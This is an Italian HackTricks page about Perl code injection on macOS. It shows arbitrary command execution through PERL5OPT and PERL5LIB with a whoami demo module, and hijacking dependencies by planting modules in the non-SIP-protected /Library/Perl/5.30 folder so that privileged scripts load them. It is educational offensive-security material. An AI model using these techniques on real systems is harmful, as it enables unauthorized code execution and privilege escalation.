# Iniezione di Applicazioni Perl su macOS

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Attraverso le variabili d'ambiente `PERL5OPT` e `PERL5LIB`

Utilizzando la variabile d'ambiente PERL5OPT è possibile far eseguire a perl comandi arbitrari.\
Per esempio, crea questo script:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

Ora **esporta la variabile di ambiente** ed esegui lo script **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Un'altra opzione è creare un modulo Perl (ad esempio `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

E poi utilizzare le variabili di ambiente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Attraverso le dipendenze

È possibile elencare l'ordine delle cartelle delle dipendenze di Perl in esecuzione:
```bash
perl -e 'print join("\n", @INC)'
```
Quanto segue restituirà qualcosa del genere:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Alcune delle cartelle restituite non esistono nemmeno, tuttavia, **`/Library/Perl/5.30`** esiste, non è protetta da SIP ed è posizionata prima delle cartelle protette da SIP. Pertanto, qualcuno potrebbe abusare di quella cartella per aggiungere dipendenze di script in modo che uno script Perl ad alto privilegio le carichi.

{% hint style="warning" %}
Tuttavia, nota che **è necessario essere root per scrivere in quella cartella** e oggigiorno otterrai questo **prompt TCC**:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Ad esempio, se uno script sta importando **`use File::Basename;`** sarebbe possibile creare `/Library/Perl/5.30/File/Basename.pm` per eseguire codice arbitrario.

## References

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di Github.

</details>
{% endhint %}
